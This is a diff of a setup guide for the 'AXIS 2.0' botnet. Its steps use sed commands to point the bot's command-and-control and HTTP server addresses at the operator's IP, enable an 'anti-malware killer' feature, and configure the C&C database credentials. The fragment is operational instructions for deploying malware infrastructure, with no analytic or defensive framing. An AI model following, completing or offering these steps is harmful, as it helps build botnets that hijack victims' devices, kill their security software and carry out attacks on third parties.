@@ -141,9 +141,10 @@ echo "Your server IP: $SERVER_IP"
 Step 4.2: Configure Bot (bot/config.h)
 --------------------------------------
 cd /root/AXIS\ 2.0/bot
-sed -i 's/CNC_ADDR "127.0.0.1"/CNC_ADDR "'$SERVER_IP'"/' config.h
-sed -i 's/HTTP_SERVER_IP "0.0.0.0"/HTTP_SERVER_IP "'$SERVER_IP'"/' config.h
+# CHANGE ALL 0.0.0.0 TO YOUR SERVER IP
+sed -i 's/CNC_ADDR "0.0.0.0"/CNC_ADDR "'$SERVER_IP'"/' config.h
 sed -i 's/HTTP_SERVER "0.0.0.0"/HTTP_SERVER "'$SERVER_IP'"/' config.h
+sed -i 's/HTTP_SERVER_IP "0.0.0.0"/HTTP_SERVER_IP "'$SERVER_IP'"/' config.h
 
 # Enable features (edit config.h)
 #define KILLER      // Enable anti-malware killer
@@ -153,10 +154,10 @@ sed -i 's/HTTP_SERVER "0.0.0.0"/HTTP_SERVER "'$SERVER_IP'"/' config.h
 Step 4.3: Configure C&C (cnc/main.go)
 -------------------------------------
 cd /root/AXIS\ 2.0/cnc
-# Edit database credentials if different from defaults
-# DatabaseAddr = "127.0.0.1:3306"
-# DatabaseUser = "axis"
-# DatabasePass = "axis_secure_pass_2024!"
+# Edit database credentials - change 0.0.0.0 to 127.0.0.1 for local DB
+# DatabaseAddr = "0.0.0.0:3306" -> "127.0.0.1:3306"
+# DatabaseUser = "root"
+# DatabasePass = "your_secure_password"
 
 Step 4.4: Configure Loader (loader/config.h)
 --------------------------------------------
